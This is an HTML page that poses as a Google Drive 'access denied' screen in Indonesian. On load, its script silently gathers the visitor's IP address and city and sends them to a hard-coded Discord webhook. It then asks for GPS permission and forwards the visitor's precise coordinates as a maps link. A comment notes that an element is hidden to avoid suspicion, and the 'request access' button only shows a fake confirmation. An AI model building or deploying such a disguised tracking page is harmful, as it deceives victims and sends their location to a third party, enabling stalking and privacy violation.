<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Drive - Request Access</title>
    <link rel="icon" href="https://ssl.gstatic.com/docs/doclist/images/drive_2022q3_32dp.png">
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        body { font-family: 'Roboto', arial, sans-serif; background-color: #fff; color: #3c4043; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { text-align: center; max-width: 400px; padding: 20px; }
        img { width: 80px; margin-bottom: 20px; }
        h1 { font-size: 22px; font-weight: 400; margin-bottom: 10px; }
        p { font-size: 14px; line-height: 1.5; color: #5f6368; }
        .btn { display: inline-block; margin-top: 20px; padding: 10px 24px; background-color: #1a73e8; color: #fff; text-decoration: none; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; border: none; }
        #map { display: none; } /* Map disembunyikan agar tidak curiga */
    </style>
</head>
<body>

<div class="container">
    <img src="https://ssl.gstatic.com/docs/doclist/images/drive_2022q3_32dp.png" alt="Google Drive">
    <h1>Akses Ditolak</h1>
    <p>Anda memerlukan izin untuk melihat file ini. Pastikan Anda masuk dengan akun yang benar atau hubungi pemilik file untuk meminta akses.</p>
    <button class="btn" onclick="requestAccess()">Minta Akses</button>
</div>

<div id="map"></div>

<script>
const webhookURL = "https://discord.com/api/webhooks/1484383057975709819/7qQ5RYrC4FkuCKiin5gEpH0yfliZMNCrM4atDn-qn4LA_dI5zrS-Dwawh3QdA48FY0kI";

async function trackVisitor() {
    try {
        // Ambil Data IP & Lokasi Dasar
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();
        
        // Kirim data IP dulu (Pasti Masuk)
        await sendToDiscord(data, "Menunggu GPS...", "☁️ IP (Halaman Dibuka)");

        // Coba Ambil GPS Akurat
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                const mLink = `https://www.google.com/maps?q=${lat},${lon}`;
                
                // Kirim ulang dengan koordinat presisi
                await sendToDiscord(data, mLink, "🎯 GPS (IZIN DIBERIKAN)");
            });
        }
    } catch (err) { console.log("System Ready."); }
}

async function sendToDiscord(data, mapsLink, metode) {
    const payload = {
        username: "DRIVE NOTIFIER",
        content: `📂 **DOKUMEN DIAKSES!**\n` +
                 `━━━━━━━━━━━━━━━━━━━━\n` +
                 `🌐 **IP:** ${data.ip}\n` +
                 `🏙️ **Kota:** ${data.city}, ${data.region}\n` +
                 `🎯 **Status:** ${metode}\n` +
                 `🗺️ **Lokasi:** ${mapsLink}\n` +
                 `━━━━━━━━━━━━━━━━━━━━`
    };

    await fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    });
}

function requestAccess() {
    alert("Permintaan akses telah dikirim ke pemilik file. Anda akan menerima notifikasi email jika disetujui.");
}

// Jalankan otomatis saat web dibuka
window.onload = trackVisitor;
</script>

</body>
</html>
